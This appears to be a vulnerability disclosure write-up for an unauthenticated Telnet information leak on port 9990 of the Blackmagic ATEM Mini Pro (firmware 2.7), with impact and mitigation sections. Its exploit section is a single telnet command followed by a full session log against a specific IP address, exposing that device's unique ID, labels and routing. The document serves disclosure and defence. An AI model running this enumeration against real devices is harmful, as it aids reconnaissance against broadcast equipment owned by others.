# Blackmagic ATEM Mini Pro – Information Disclosure via Telnet (Port 9990)

## Description:

The Blackmagic ATEM Mini Pro exposes sensitive device and stream configuration information via an unauthenticated Telnet service on port 9990. Upon connection, the attacker can access a protocol preamble that leaks the video mode, routing configuration, input/output labels, device model, and even internal identifiers such as the unique ID. This can be used for reconnaissance and planning further attacks.

## Product
**Blackmagic Design – ATEM Mini Pro**  
**Firmware/Software Version:** 2.7

## Vulnerability Type
**Information Disclosure**

## Affected Component(s)
- Telnet Service (Port 9990)
- Device Configuration Management
- Stream Information Interface

## Attack Vector(s)
An unauthenticated attacker with network access can connect to the device over **Telnet port 9990**, which returns sensitive information including stream configuration, device model, routing table, and hardware labels without any authentication.

---

## Vulnerable Endpoint
- **Port:** `9990`
- **Protocol:** Telnet

## Exploit Example

```sh
telnet <target-ip> 9990
```

## Example Session Output
```sh
┌──(user㉿host)-[~]
└─$ telnet 172.242.35.6 9990
Trying 172.242.35.6...
Connected to 172.242.35.6.
Escape character is '^]'.
PROTOCOL PREAMBLE:
Version: 2.7

VIDEOHUB DEVICE:
Device present: true
Model name: ATEM Mini Pro
Friendly name: ATEM Mini Pro
Unique ID: 316b239a63ea45b9bf47fedc5ca480c0
Video inputs: 14
Video outputs: 4

INPUT LABELS:
0 Black
1 Camera 1
2 Camera 2
3 Camera 3
4 Camera 4
5 Color Bars
6 Color 1
7 Color 2
8 Media Player 1
9 Media Player 1 Key
10 Multiview
11 Program
12 Preview
13 Camera 1 Direct

VIDEO INPUT STATUS:
0 Internal
1 HDMI
2 HDMI
3 HDMI
4 HDMI
5 Internal
6 Internal
7 Internal
8 Internal
9 Internal
10 Internal
11 Internal
12 Internal
13 HDMI

OUTPUT LABELS:
0 Output
1 Webcam Out
2 Program
3 Preview

CONFIGURATION:
Video Mode: 1080p24

VIDEO OUTPUT ROUTING:
0 11
1 11
2 1
3 1

VIDEO OUTPUT LOCKS:
0 U
1 U
2 U
3 U

END PRELUDE:
```
## Proof of Concept (PoC) for(CE,Information Disclosure)
<img width="1718" height="868" alt="Image" src="https://github.com/user-attachments/assets/bf0ea3b8-9553-42a0-945a-982c1794295f" />

https://github.com/user-attachments/assets/357c0349-e275-466f-a97c-7eca4d189a3f

## Impact

This vulnerability allows attackers to:

    Enumerate device configurations

    View input/output routing and status

    Identify device metadata (model, firmware version, unique ID)

    Monitor live stream setup

No credentials or authentication are required.

## Mitigation

    Block or disable access to port 9990 from untrusted networks.

    Restrict Telnet access to trusted internal IPs only.

    Upgrade firmware, if a newer version mitigates this exposure.

    Consider disabling Telnet entirely in production environments.
